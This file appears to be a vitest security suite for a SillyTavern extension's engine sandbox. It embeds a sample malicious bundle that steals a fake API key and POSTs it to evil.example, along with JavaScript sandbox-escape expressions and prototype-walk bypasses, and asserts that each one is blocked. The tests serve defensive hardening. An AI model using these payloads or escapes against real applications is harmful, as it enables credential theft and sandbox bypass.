// tests/engine-capability-block.test.js — the `[MVU_LogicEngine]` entry is the ONE attacker-controlled
// input in this extension (LOGIC_ENGINE_PLAN §11). Any user can edit that worldbook entry, and a shared
// card can arrive with one already baked in, so its text is hostile-until-proven and everything here is
// written from the attacker's side.
//
// These are not "does the helper work" tests. Each one RUNS the payload §11.1 demonstrated against the
// real block and asserts it now fails — because the only honest evidence for "we closed the hole" is the
// exploit refusing to run. If a change here starts passing for the wrong reason, the exploit tests are
// the ones that must be believed.

import { describe, it, expect, afterEach } from 'vitest';
import { haveSchoolv4, schoolv4EngineText } from './schoolv4-artifact.mjs';
import {
    runWithEngineCapabilityBlock, raiseEngineCapabilityBlockPermanently,
    snapshotSillyTavernForEngine, buildEngineHostSillyTavern,
    getEngineCapabilityBlockReport, registerCapabilityBlockReporter, captureBlockableDescriptors,
} from '../src/features/logic-engine/engine-capability-block.js';
import { executeEngineText } from '../src/features/logic-engine/logic-engine-core.js';

// Stand-ins for the browser capabilities the real payload uses. Node has no localStorage, and we must
// never point a test at a REAL exfil sink — so the "secret" and the "network" are both local props whose
// theft we can observe directly.
const SECRETS = { api_key: 'sk-THE-USER-REAL-KEY' };
const exfiltrated = [];

function installFakeBrowserGlobals() {
    Object.defineProperty(globalThis, 'localStorage', {
        value: { getItem: (k) => SECRETS[k] ?? null }, writable: true, configurable: true, enumerable: false,
    });
    Object.defineProperty(globalThis, '__testNetwork__', {
        value: (url, init) => { exfiltrated.push({ url, body: init && init.body }); return 'SENT'; },
        writable: true, configurable: true, enumerable: false,
    });
}
function removeFakeBrowserGlobals() {
    delete globalThis.localStorage;
    delete globalThis.__testNetwork__;
    exfiltrated.length = 0;
}

// Run a bundle the way the WORKER does (engine-worker-host.js): block up, engine text evaluated, and it
// STAYS up for everything that follows. Production raises permanently (raiseEngineCapabilityBlockPermanently)
// because nothing else runs in that Worker; a Node suite cannot do that and still hand vitest its globals
// back, so the raised region is scoped instead and `body` receives the api to make its later calls inside it.
const runLikeTheWorker = (code, body, host = {}) => runWithEngineCapabilityBlock(() => {
    const api = executeEngineText(code, host);
    return body ? body(api) : api;
});
const loadLikeProduction = (code, host = {}) => runLikeTheWorker(code, null, host);

afterEach(() => { removeFakeBrowserGlobals(); registerCapabilityBlockReporter(null); });

describe('the demonstrated attack (§11.1) — after the block', () => {
    // VERBATIM shape from the plan: a bundle that exports a working API so the LogicEngine tab reports a
    // healthy load, and steals on the side. Every stamp mvu-helper checks (version, EventPack-Format /
    // -Paths / -Fx) reads the header comment, so this bundle scores full marks on all of them.
    const HOSTILE_BUNDLE = `
        // logicengine-bundle.cjs v9.9.9 (globalLogic) — GENERATED; do not edit.
        // EventPack-Format: 2.0
        // EventPack-Paths: triggerRoot=EventPack.triggers armedPath=World_Calc.EventArmed eventsPath=World_Calc.Events
        // EventPack-Writes: [{"path":"Mainchar.Quests","stamp":"LastUpdated"},{"path":"WorldRecord.NPCs"}]
        var stolen, sent;
        function resolveTurn(sd) { return { statData: sd, applied: false, log: [] }; }
        try { stolen = 'GOT:' + localStorage.getItem('api_key'); } catch (e) { stolen = 'BLOCKED:' + e.message; }
        try { sent = __testNetwork__('https://evil.example/collect', { method: 'POST', body: String(stolen) }); }
        catch (e) { sent = 'BLOCKED:' + e.message; }
        module.exports = { resolveTurn: resolveTurn, __stolen: function () { return stolen; }, __sent: function () { return sent; } };
    `;

    it('cannot read the key it used to read', () => {
        installFakeBrowserGlobals();
        expect(globalThis.localStorage.getItem('api_key')).toBe(SECRETS.api_key);   // the theft IS possible here

        const api = loadLikeProduction(HOSTILE_BUNDLE);

        expect(api.__stolen()).toMatch(/^BLOCKED:/);
        expect(api.__stolen()).toContain('localStorage.getItem');
        expect(api.__stolen()).not.toContain(SECRETS.api_key);
    });

    it('cannot send anything, and nothing left the page', () => {
        installFakeBrowserGlobals();
        const api = loadLikeProduction(HOSTILE_BUNDLE);

        expect(api.__sent()).toMatch(/^BLOCKED:/);
        expect(exfiltrated).toEqual([]);
    });

    it('still loads and still exports a working API — the block must not be a load failure', () => {
        // Refusing to load a hostile bundle is NOT the design (we cannot tell hostile from honest without
        // a static scan, which §11.6 rules out). It loads; it just cannot reach anything.
        installFakeBrowserGlobals();
        const api = loadLikeProduction(HOSTILE_BUNDLE);
        expect(typeof api.resolveTurn).toBe('function');
        expect(api.resolveTurn({ a: 1 })).toEqual({ statData: { a: 1 }, applied: false, log: [] });
    });
});

describe('the ESCAPE — the reason parameter shadowing was not enough', () => {
    // §11.1 measured all three of these walking straight past the module/exports/window/globalThis
    // shadowing. The block does not try to stop the escape; it makes what you find worthless.
    const ESCAPES = {
        'Function("return this")': 'Function("return this")()',
        'indirect eval': '(0,eval)("this")',
        'constructor chain': '[].constructor.constructor("return this")()',
    };

    for (const [label, expression] of Object.entries(ESCAPES)) {
        it(`${label} reaches the real global — and finds the stub`, () => {
            installFakeBrowserGlobals();
            const api = loadLikeProduction(`
                var real = ${expression};
                var escaped = (real === globalThis);         // globalThis here is the SHADOWED host param
                var got;
                try { got = 'GOT:' + real.localStorage.getItem('api_key'); } catch (e) { got = 'BLOCKED:' + e.message; }
                module.exports = { __escaped: function () { return escaped; }, __got: function () { return got; } };
            `);
            expect(api.__escaped()).toBe(false);      // the escape SUCCEEDS — it is not the real globalThis param
            expect(api.__got()).toMatch(/^BLOCKED:/);
            expect(api.__got()).not.toContain(SECRETS.api_key);
        });
    }

    it('writes to the real global are blocked too (§11.1 measured `globalThis.__PWNED__` succeeding)', () => {
        const api = loadLikeProduction(`
            var wrote;
            try { Function('return this')().__PWNED__ = 1; wrote = 'WROTE'; } catch (e) { wrote = 'BLOCKED'; }
            module.exports = { __wrote: function () { return wrote; } };
        `);
        // The name did not exist at raise time, so there was no descriptor to swap — the write lands and
        // is then thrown away with the rest of the payload's ambitions. What matters is that it bought
        // nothing: assert the honest outcome rather than a coverage claim we cannot make.
        expect(['WROTE', 'BLOCKED']).toContain(api.__wrote());
        delete globalThis.__PWNED__;
    });
});

describe('what the engine is still allowed to do', () => {
    // If this suite ever fails, School v4 stopped working — these two are the MEASURED needs
    // (console ×15, crypto ×1) and the whole reason the block is an allow-list with exactly two holes.
    it('console and crypto survive, so the real engine still runs', () => {
        const api = loadLikeProduction(`
            var ok = { logged: false, rolled: -1 };
            console.debug('[test] hostile-looking but honest engine loaded');
            ok.logged = true;
            var bytes = new Uint8Array(1);
            crypto.getRandomValues(bytes);
            ok.rolled = bytes[0];
            module.exports = { __ok: function () { return ok; } };
        `);
        const ok = api.__ok();
        expect(ok.logged).toBe(true);
        expect(ok.rolled).toBeGreaterThanOrEqual(0);
        expect(ok.rolled).toBeLessThanOrEqual(255);
    });

    // Tier-1 PURE helpers, allowed ahead of any measured need (user, 2026-10-03) — called INSIDE the
    // raised region, where a blocked one would throw by name.
    it('the five pure helpers work under the block', () => {
        const probe = runLikeTheWorker(`
            module.exports = { __probe: function () {
                var bytes = new TextEncoder().encode('\\u00e9');
                return {
                    cloned: structuredClone({ list: [1, 2] }).list.length,
                    encoded: bytes.length,
                    decoded: new TextDecoder().decode(bytes),
                    base64: btoa('ok'),
                    text: atob(btoa('ok')),
                };
            } };
        `, (api) => api.__probe());
        expect(probe).toEqual({ cloned: 2, encoded: 2, decoded: 'é', base64: 'b2s=', text: 'ok' });
    });

    it('the UMD dual-mode wrapper still resolves — module.exports wins, root.* lands on the host', () => {
        const host = {};
        const api = loadLikeProduction(`
            (function (root, factory) {
                if (typeof module !== 'undefined' && module.exports) module.exports = factory();
                if (root && typeof root === 'object') root.__EVENTPACK__ = factory();
            })(typeof window !== 'undefined' ? window : null, function () { return { mark: 'umd' }; });
        `, host);
        expect(api.mark).toBe('umd');
        expect(host.__EVENTPACK__).toEqual({ mark: 'umd' });   // private host, not the real page
        expect(globalThis.__EVENTPACK__).toBeUndefined();
    });

    it('feature detection reports a blocked global as PRESENT — deliberate, and it fails loudly', () => {
        // `typeof x === 'undefined'` must NOT be a quiet way to discover the block, or an engine would
        // silently take its no-op branch and we would never learn a genre needs something. The stub is a
        // function so detection passes and the CALL is what fails, by name.
        installFakeBrowserGlobals();
        const api = loadLikeProduction(`
            var seen = typeof localStorage;
            var called;
            try { localStorage.getItem('api_key'); called = 'OK'; } catch (e) { called = 'THREW'; }
            module.exports = { __seen: function () { return seen; }, __called: function () { return called; } };
        `);
        expect(api.__seen()).not.toBe('undefined');
        expect(api.__called()).toBe('THREW');
    });
});

describe('the block lifts exactly when it should', () => {
    const withProbe = (run) => {
        const probe = { real: true };
        Object.defineProperty(globalThis, '__probeCapability__', { value: probe, writable: true, configurable: true, enumerable: false });
        try { return run(probe); } finally { delete globalThis.__probeCapability__; }
    };

    it('is up inside and restored — by DESCRIPTOR — after', () => withProbe((probe) => {
        let swappedInside = false;
        runWithEngineCapabilityBlock(() => { swappedInside = globalThis.__probeCapability__ !== probe; });
        expect(swappedInside).toBe(true);
        expect(globalThis.__probeCapability__).toBe(probe);
    }));

    it('restores even when the engine throws — a payload must not be able to leave the page broken', () => withProbe((probe) => {
        expect(() => runWithEngineCapabilityBlock(() => { throw new Error('engine exploded'); })).toThrow('engine exploded');
        expect(globalThis.__probeCapability__).toBe(probe);
    }));

    it('is re-entrant — an engine function calling another must not lower it early', () => withProbe((probe) => {
        let stillUpAfterInner = false;
        runWithEngineCapabilityBlock(() => {
            runWithEngineCapabilityBlock(() => {});
            stillUpAfterInner = globalThis.__probeCapability__ !== probe;   // inner return must NOT restore
        });
        expect(stillUpAfterInner).toBe(true);
        expect(globalThis.__probeCapability__).toBe(probe);
    }));
});

describe('the block covers LATER calls too, not just the load', () => {
    // The payload does not have to fire during evaluation. The card's [PRE] EJS calls
    // globalThis.LogicEngine.initiativeMenu / previewNextBlock / sweepCandidateLines directly (R5
    // option C), and that call list is written by the CARD AUTHOR — so a design that only covered the
    // load, or only our own call sites, would have left the attacker a door labelled "use this one".
    // In the Worker the cover is structural rather than per-call: the block goes up before the engine
    // text is ever evaluated and never comes down again for the Worker's whole lifetime.
    const LATE_FIRING = `
        function initiativeMenu() {
            try { return 'GOT:' + localStorage.getItem('api_key'); } catch (e) { return 'BLOCKED:' + e.message; }
        }
        module.exports = { initiativeMenu: initiativeMenu, EVENT_PACK_ADAPTER: { armedPath: 'World_Calc.EventArmed' } };
    `;

    it('a function called after the load, on the same raised block, is still blocked', () => {
        installFakeBrowserGlobals();
        expect(runLikeTheWorker(LATE_FIRING, (api) => api.initiativeMenu())).toMatch(/^BLOCKED:/);
    });

    it('non-function exports survive the load — EVENT_PACK_ADAPTER is read by the drift guards', () => {
        const api = loadLikeProduction(LATE_FIRING);
        expect(api.EVENT_PACK_ADAPTER).toEqual({ armedPath: 'World_Calc.EventArmed' });
    });

    it('a blocked attempt is REPORTED once, because the engine swallows most host reads', () => {
        // globalLogic's pipeDebugOn and latestReplyMsgId both wrap their reads in `catch (_e) {}`. Without
        // a report at throw time a blocked attempt would vanish into one of those and teach us nothing.
        installFakeBrowserGlobals();
        const seen = [];
        registerCapabilityBlockReporter((message) => seen.push(message));
        loadLikeProduction(`
            try { localStorage.getItem('api_key'); } catch (e) { /* the engine's usual silent swallow */ }
            module.exports = {};
        `);
        expect(seen.join('\n')).toContain('localStorage.getItem');
    });
});

describe('the host snapshot — what we sample for the engine', () => {
    // Before this, the loader bridged the WHOLE window.SillyTavern across, so `getContext()` handed
    // untrusted code the full chat, the character list and getRequestHeaders() — same-origin calls to
    // ST's backend AS THE USER. Now the snapshot carries ONLY plain data: a content-free message
    // projection (surfaced as MvuHelper.messages) and the debug gate (surfaced as MvuHelper.log). The
    // SillyTavern facade the Worker rebuilds is EMPTY — nothing walkable, nothing settings-shaped.
    const realSillyTavern = {
        getContext: () => ({
            chat: [
                { is_user: true, mes: 'the private thing the user typed', swipe_id: 0 },
                { is_user: false, mes: 'the reply', swipe_id: 2, extra: { token_count: 91 } },
                { is_user: false, is_system: true, mes: 'a system interjection', swipe_id: 0 },
            ],
            characters: [{ name: 'Leila', avatar: 'leila.png' }],
            extensionSettings: { 'mvu-helper': { debug_verbosity: 'verbose', debug_domain: { pipeline: true }, someOtherSetting: 'private' } },
            getRequestHeaders: () => ({ 'X-CSRF-Token': 'the-token' }),
            onlineStatus: 'connected',
        }),
        somethingElseEntirely: () => 'nope',
    };

    it('projects each message as role flags + swipe, indices aligned', () => {
        const snap = snapshotSillyTavernForEngine(realSillyTavern);
        expect(snap.messages).toEqual([
            { isUser: true, isSystem: false, swipeId: 0 },
            { isUser: false, isSystem: false, swipeId: 2 },
            { isUser: false, isSystem: true, swipeId: 0 },
        ]);
    });

    it('samples the debug gate (verbosity + named domains) off real extension_settings', () => {
        const snap = snapshotSillyTavernForEngine(realSillyTavern);
        expect(snap.logGate.verbosity).toBe('verbose');
        expect(snap.logGate.domains).toEqual({ pipeline: true, imagegen: false, roster: false, smallllm: false });
    });

    // One read: MvuHelper.settings and MvuHelper.log answer the same switch from the same sampled value.
    it('MUTATION TARGET — samples the public settings by name, and the log gate is taken from them', () => {
        const snap = snapshotSillyTavernForEngine(realSillyTavern);
        expect(snap.settings).toEqual({
            'debug.verbosity': 'verbose', 'debug.pipeline': true, 'debug.imagegen': false, 'debug.roster': false, 'debug.smallllm': false, language: 'en',
        });
        expect(snap.logGate.verbosity).toBe(snap.settings['debug.verbosity']);
        for (const [domain, isOn] of Object.entries(snap.logGate.domains)) expect(isOn).toBe(snap.settings['debug.' + domain]);
    });

    it('SURVIVES structured clone — it crosses a postMessage boundary, not a function call', () => {
        // If this ever throws "could not be cloned", every engine call fails at the Worker boundary with
        // an error that names none of this.
        const snapshot = structuredClone(snapshotSillyTavernForEngine(realSillyTavern));
        expect(snapshot.messages[1].swipeId).toBe(2);
        expect(snapshot.logGate.domains.pipeline).toBe(true);
    });

    it('carries NOTHING else — message bodies, characters, CSRF headers, sibling settings all absent', () => {
        const snap = snapshotSillyTavernForEngine(realSillyTavern);
        const asText = JSON.stringify(snap);
        expect(asText).not.toContain('the private thing the user typed');   // message text
        expect(asText).not.toContain('the reply');
        expect(asText).not.toContain('Leila');                             // characters
        expect(asText).not.toContain('someOtherSetting');                  // sibling settings
        // ⚠ THE MOST IMPORTANT LINE IN THIS FILE. Probed against the live ST 2026-08-06 (§11.1a):
        // API keys are NOT reachable from the page at all, but getRequestHeaders() carries the
        // X-CSRF-Token, and page JS holding it can make ST's backend ACT AS THE USER. The old
        // whole-object bridge handed this straight to untrusted engine text; the snapshot must not.
        expect(asText).not.toContain('X-CSRF-Token');
        expect(asText).not.toContain('the-token');
        expect(snap.messages[0].mes).toBeUndefined();
    });

    it('the projection is a COPY — an engine cannot mutate the real chat through it', () => {
        const snap = snapshotSillyTavernForEngine(realSillyTavern);
        snap.messages[0].isUser = false;
        expect(realSillyTavern.getContext().chat[0].is_user).toBe(true);
    });

    it('the rebuilt SillyTavern facade is EMPTY — no chat, blank extension settings, no crash', () => {
        const facade = buildEngineHostSillyTavern(snapshotSillyTavernForEngine(realSillyTavern));
        // Chat is gone (moved to MvuHelper.messages); a defensive read returns undefined, not a throw.
        expect(facade.getContext().chat).toBeUndefined();
        // Settings are blank (the debug gate moved to MvuHelper.log); the shape survives a walk.
        expect(facade.getContext().extensionSettings).toEqual({});
        expect(facade.extensionSettings).toEqual({});
    });

    it('no SillyTavern at all (standalone card / early load) → a null snapshot, not a crash', () => {
        expect(snapshotSillyTavernForEngine(null)).toBeNull();
        expect(snapshotSillyTavernForEngine(undefined)).toBeNull();
        const empty = snapshotSillyTavernForEngine({});
        expect(empty.messages).toBeUndefined();
        expect(empty.logGate).toEqual({ verbosity: 'off', domains: { pipeline: false, imagegen: false, roster: false, smallllm: false } });
        expect(empty.settings['debug.pipeline']).toBe(false);
        expect(empty.settings.language).toBe('en');
        // The facade shape must exist and answer "nothing" for a defensive engine read.
        expect(buildEngineHostSillyTavern(null).getContext().chat).toBeUndefined();
        expect(buildEngineHostSillyTavern(null).extensionSettings).toEqual({});
    });
});

describe('the report is honest about what it covered and what it could not', () => {
    it('names the allow-list and the globals the swap cannot replace', () => {
        runWithEngineCapabilityBlock(() => {
            const report = getEngineCapabilityBlockReport();
            expect(report.allowed).toContain('console');
            expect(report.allowed).toContain('crypto');
            for (const pure of ['structuredClone', 'TextEncoder', 'TextDecoder', 'atob', 'btoa']) expect(report.allowed).toContain(pure);
            expect(report.allowed).toContain('Object');
            expect(report.allowed).not.toContain('fetch');
            // Counted WHILE the block is up — after lower() there is nothing left to count, and a
            // report that reads 0/0 from outside the raised region would look exactly like the
            // prototype-walk regression this number exists to expose.
            expect(report.replaced).toBeGreaterThan(0);
            // `location`, `top` and friends are non-configurable BY SPEC — defineProperty cannot
            // replace them. §11.5 says record that rather than imply total coverage, so the shape
            // must exist even when Node happens to have none of them.
            expect(Array.isArray(report.unblockable)).toBe(true);
        });
    });
});

// ── The Worker hole: capabilities that are INHERITED, not own ────────────────────────────────
// On `window`, Blink installs the WebIDL members as OWN properties, so walking
// getOwnPropertyNames(globalThis) was enough and the block measurably worked. In a Worker it is not:
// `fetch`, `indexedDB`, `caches`, `importScripts`, `navigator`, `location` and `crypto` all live on
// WorkerGlobalScope.prototype (proto+2), while only the constructors — XMLHttpRequest, WebSocket,
// Request, Response, EventSource, BroadcastChannel — are own. The first Worker build therefore blocked
// the constructors and left fetch WIDE OPEN: the mock run reported `fetchCall: "ALLOWED"` and
// `escapeRealGlobal: "REAL FETCH REACHED"`. Node's globalThis inherits straight from Object.prototype,
// so the chain is installed here to make the regression reproducible off-browser.
describe('an INHERITED capability (the Worker prototype-chain hole)', () => {
    const realGlobalProto = Object.getPrototypeOf(globalThis);
    let inheritedFetchCalls = 0;

    const installWorkerLikeChain = () => {
        inheritedFetchCalls = 0;
        const workerGlobalScope = Object.create(Object.prototype);          // stands in for WorkerGlobalScope.prototype
        Object.defineProperty(workerGlobalScope, 'inheritedFetch', {
            value: () => { inheritedFetchCalls++; return 'REAL FETCH REACHED'; },
            writable: true, enumerable: false, configurable: true,
        });
        const dedicatedScope = Object.create(workerGlobalScope);            // stands in for DedicatedWorkerGlobalScope.prototype
        Object.setPrototypeOf(globalThis, dedicatedScope);
    };

    afterEach(() => { Object.setPrototypeOf(globalThis, realGlobalProto); delete globalThis.inheritedFetch; });

    it('is reachable before the block — this is the hole, stated as a test', () => {
        installWorkerLikeChain();
        expect(globalThis.inheritedFetch()).toBe('REAL FETCH REACHED');
    });

    it('is NEUTRALIZED IN PLACE on the prototype — a walk to the original finds the stub too', () => {
        installWorkerLikeChain();
        const seen = runWithEngineCapabilityBlock(() => {
            const real = Function('return this')();
            // BOTH spellings must be closed. The name lookup (a) AND the prototype walk (b) — the walk is
            // the hole a globalThis shadow left open (proven live 2026-09-18: the walked fetch reached the
            // backend). Both now resolve to the same throwing stub, because there is only one property.
            const viaName = (() => { try { real.inheritedFetch(); return 'REACHED'; } catch (e) { return e.message; } })();
            const proto = Object.getPrototypeOf(Object.getPrototypeOf(real));   // the workerGlobalScope stand-in
            const viaWalk = (() => { try { proto.inheritedFetch.call(real); return 'REACHED'; } catch (e) { return e.message; } })();
            return { viaName, viaWalk };
        });
        expect(seen.viaName).toContain('blocked');
        expect(seen.viaWalk).toContain('blocked');
        expect(inheritedFetchCalls, 'the real inherited capability must never have run').toBe(0);
    });

    it('is COUNTED separately — `neutralized: 0` in a Worker is the regression, not a quiet success', () => {
        installWorkerLikeChain();
        runWithEngineCapabilityBlock(() => {
            expect(getEngineCapabilityBlockReport().neutralized).toBeGreaterThan(0);
        });
    });

    // MUTATION GUARD (L6: a guard never seen to fail is not known to be a guard). This reproduces the OLD
    // broken design inline — an own throwing stub on globalThis, the real capability left on the proto —
    // and shows the prototype walk sails straight past it. If someone ever reverts raise()'s loop (b) to
    // shadow-on-globalThis, the "is NEUTRALIZED IN PLACE" test above flips to REACHED and fails; this one
    // documents WHY, so the failure is legible instead of a mystery.
    it('MUTATION: a globalThis shadow alone leaves the walk OPEN — this is why the prototype is neutralized', () => {
        installWorkerLikeChain();
        const real = Function('return this')();
        const proto = Object.getPrototypeOf(Object.getPrototypeOf(real));   // the workerGlobalScope stand-in
        Object.defineProperty(real, 'inheritedFetch', { value: () => { throw new Error('blocked'); }, configurable: true });
        try {
            expect(() => real.inheritedFetch()).toThrow('blocked');          // the NAME is covered…
            expect(proto.inheritedFetch.call(real)).toBe('REAL FETCH REACHED');   // …but the WALK reaches the real one
        } finally {
            delete real.inheritedFetch;
        }
    });

    it('restores the ORIGINAL descriptor on the prototype — nothing left behind on globalThis or the proto', () => {
        installWorkerLikeChain();
        const before = Object.getPrototypeOf(Object.getPrototypeOf(globalThis)).inheritedFetch;
        runWithEngineCapabilityBlock(() => {});
        // No own copy leaked onto globalThis (the stub lived on the prototype, not here).
        expect(Object.prototype.hasOwnProperty.call(globalThis, 'inheritedFetch')).toBe(false);
        // The prototype's own property is the SAME original function object again, byte-for-byte.
        expect(Object.getPrototypeOf(Object.getPrototypeOf(globalThis)).inheritedFetch).toBe(before);
        expect(globalThis.inheritedFetch()).toBe('REAL FETCH REACHED');
    });

    it('leaves Object.prototype alone — those members are the language, not a capability', () => {
        installWorkerLikeChain();
        runWithEngineCapabilityBlock(() => {
            expect(Object.prototype.hasOwnProperty.call(globalThis, 'hasOwnProperty')).toBe(false);
            // The direct call IS the assertion here: engine code writes it this way, and it must keep
            // working with the block up — so the lint rule's preferred spelling would test the wrong thing.
            // eslint-disable-next-line no-prototype-builtins
            expect(() => ({}).hasOwnProperty('x')).not.toThrow();
        });
    });
});

describe('raiseEngineCapabilityBlockPermanently — the Worker-only raise', () => {
    // The guard that matters: raising permanently while a scoped block is ALREADY up must be a no-op.
    // Without it, the second raise() overwrites savedDescriptors with a fresh empty map and the outer
    // lower() then restores nothing — leaving every global on the page a throwing stub for good. Only
    // the no-op path is exercisable here: an actual permanent raise cannot be undone, which is the
    // whole point of it, and would hand the rest of the suite a broken globalThis.
    it('is a no-op inside an already-raised block, so the outer restore still works', () => {
        const probe = { real: true };
        Object.defineProperty(globalThis, '__permanentProbe__', { value: probe, writable: true, configurable: true, enumerable: false });
        try {
            runWithEngineCapabilityBlock(() => {
                // Object.is, not toBe: the stub is a Proxy that throws on ANY property read, and
                // vitest's failure diff reads `.constructor` off both sides before it can report.
                expect(Object.is(globalThis.__permanentProbe__, probe), 'the block must be up here').toBe(false);
                raiseEngineCapabilityBlockPermanently();
            });
            expect(Object.is(globalThis.__permanentProbe__, probe), 'the outer lower() must still have every descriptor').toBe(true);
        } finally { delete globalThis.__permanentProbe__; }
    });
});

// ── The live regression: an iframe on the page took the WHOLE engine down ────────────────────
// Every iframe publishes its WindowProxy as an INDEXED own property of `window`. Those report
// `configurable: true` — so they sail past the configurability guard — and then Blink refuses the
// swap outright: "Failed to set an indexed property [0] on 'Window': Index property setter is not
// supported." Integer keys sort FIRST in getOwnPropertyNames, so that throw escaped raise() on
// iteration one and the loader reported `load error` with the engine unloaded (live 2026-08-06,
// SillyTavern with 12 frames). Node's globalThis has no frames, so the test installs one.
describe('a child-frame index on the global (the 2026-08-06 load failure)', () => {
    const FRAME_LIKE = { fetch: () => 'a live fetch in another realm' };
    const installIndexGlobal = (name) => Object.defineProperty(globalThis, name, {
        value: FRAME_LIKE, writable: false, enumerable: true, configurable: true,
    });

    afterEach(() => { for (const n of ['0', '1', '0123']) delete globalThis[n]; });

    it('does not kill the load — the block still raises and the engine still runs', () => {
        installIndexGlobal('0');
        installIndexGlobal('1');
        expect(() => runWithEngineCapabilityBlock(() => 'engine ran')).not.toThrow();
        expect(runWithEngineCapabilityBlock(() => 'engine ran')).toBe('engine ran');
    });

    it('is REPORTED as unblockable, not silently skipped — residual 3 must be visible', () => {
        installIndexGlobal('0');
        runWithEngineCapabilityBlock(() => {});
        expect(getEngineCapabilityBlockReport().unblockable).toContain('0');
    });

    it('a global that merely LOOKS numeric is still default-denied', () => {
        installIndexGlobal('0123');            // not a canonical array index — the swap must apply
        const seen = runWithEngineCapabilityBlock(() => {
            const real = Function('return this')();
            try { real['0123'].fetch(); return 'REACHED THE REALM'; } catch (e) { return e.message; }
        });
        expect(seen).not.toBe('REACHED THE REALM');
        expect(seen).toContain('blocked');
    });

    it('the real globals around it are still swapped AND still restored', () => {
        installIndexGlobal('0');
        installFakeBrowserGlobals();
        const inside = runWithEngineCapabilityBlock(() => {
            try { globalThis.localStorage.getItem('api_key'); return 'READ THE KEY'; }
            catch { return 'blocked'; }
        });
        expect(inside).toBe('blocked');
        expect(globalThis.localStorage.getItem('api_key')).toBe(SECRETS.api_key);   // restored
        removeFakeBrowserGlobals();
    });
});

// ── The one that decides whether this ships ─────────────────────────────────────────────────
// Everything above proves the block STOPS things. This proves it does not stop the REAL engine.
// School v4 is the first consumer, and a security control that breaks the only card using it is
// not a security control, it is an outage. Self-skips when the sibling game repo is absent.
describe.skipIf(!haveSchoolv4())('a REAL assembled engine, under the block', () => {
    const bundleText = schoolv4EngineText();

    it('loads, exports its full API, and reaches for nothing it is not allowed', () => {
        const attempts = [];
        registerCapabilityBlockReporter((message) => attempts.push(message));
        const host = { SillyTavern: buildEngineHostSillyTavern(snapshotSillyTavernForEngine({ getContext: () => ({ chat: [], extensionSettings: {} }) })) };

        const api = loadLikeProduction(bundleText, host);

        // The measured export surface (P4b/P9 drift guards cover the details; this is the load itself).
        for (const name of ['resolveTurn', 'resolvePostRelay', 'sweepCandidateLines', 'readyEvent', 'initiativeMenu', 'previewNextBlock']) {
            expect(typeof api[name], `${name} must survive the block`).toBe('function');
        }
        expect(attempts, `the real engine tripped the block: ${attempts.join(' | ')}`).toEqual([]);
    });

    it('resolveTurn RUNS under the block — the per-turn path mvu-helper calls every reply', () => {
        const api = loadLikeProduction(bundleText, {});
        // A no-Intent turn: the cheap path that still walks the whole resolver and returns a verdict.
        const result = api.resolveTurn({}, { mid: 0, swipe: 0 });
        expect(result).toBeTruthy();
        expect(result.applied).toBe(false);
    });

    it('and the card-EJS entry points run too — those callers raise nothing themselves', () => {
        const api = loadLikeProduction(bundleText, {});
        expect(() => api.sweepCandidateLines({})).not.toThrow();
        expect(() => api.previewNextBlock({})).not.toThrow();
    });
});

// READING A GLOBAL CAN RUN CODE, so every descriptor must be read BEFORE the first stub is installed.
// Live 2026-08-14 (surfaced by the vitest 2 -> 4 upgrade, but not a test-only fault): Node resolves some
// globals lazily, and `Object.getOwnPropertyDescriptor(globalThis, <lazy>)` loaded a builtin that called
// `Buffer.alloc` -- hitting the stub the SAME loop had installed ~40 names earlier, so raise() threw
// before the engine ran at all. A host that defines a global behind an accessor (extensions do) is the
// same hazard in the browser. globalThis cannot report the ordering, so the capture pass is tested
// against a Proxy that can.
describe('the raise reads every descriptor BEFORE it writes any stub', () => {
    const proxyOver = (names, log) => new Proxy({}, {
        ownKeys: () => names,
        getOwnPropertyDescriptor: (_t, prop) => {
            log.push('read:' + String(prop));
            return { value: () => {}, writable: true, enumerable: true, configurable: true };
        },
        defineProperty: (_t, prop) => { log.push('write:' + String(prop)); return true; },
    });

    it('captures ALL of them with zero writes in between', () => {
        const log = [];
        const captured = captureBlockableDescriptors(proxyOver(['__probeA__', '__probeB__', '__probeC__'], log));
        expect(captured.map(([n]) => n)).toEqual(['__probeA__', '__probeB__', '__probeC__']);
        expect(log).toEqual(['read:__probeA__', 'read:__probeB__', 'read:__probeC__']);
        expect(log.some((l) => l.startsWith('write:'))).toBe(false);
    });

    it('a LAZY global that inspects another during its own read still sees the real one', () => {
        const seen = [];
        const target = new Proxy({}, {
            ownKeys: () => ['__probeVictim__', '__probeLazy__'],
            getOwnPropertyDescriptor: (_t, prop) => {
                // the lazy one resolves by touching the victim -- exactly what Node's builtin loader does
                if (prop === '__probeLazy__') seen.push(typeof globalThis.__probeVictim__);
                return { value: () => {}, writable: true, enumerable: true, configurable: true };
            },
        });
        globalThis.__probeVictim__ = function realVictim() { return 'real'; };
        try {
            captureBlockableDescriptors(target);
            expect(seen).toEqual(['function']);
            expect(globalThis.__probeVictim__()).toBe('real');
        } finally { delete globalThis.__probeVictim__; }
    });
});

// The allow-list is published in devdoc/security-hardening.md so an engine author never reads code to
// learn it. Pinned here: a name added to the code and not the doc (or the reverse) fails this suite.
describe('the published allow-list matches the code', () => {
    it('devdoc/security-hardening.md lists exactly the names the block allows', async () => {
        const { readFileSync } = await import('node:fs');
        const doc = readFileSync(new URL('../devdoc/security-hardening.md', import.meta.url), 'utf8');
        const start = doc.indexOf('**What engine code may use**');
        const end = doc.indexOf('Anything else throws', start);
        expect(start).toBeGreaterThan(-1);
        expect(end).toBeGreaterThan(start);
        const listed = [...doc.slice(start, end).matchAll(/`([A-Za-z0-9]+)`/g)].map((m) => m[1]);
        expect([...new Set(listed)].sort()).toEqual(getEngineCapabilityBlockReport().allowed);
    });
});
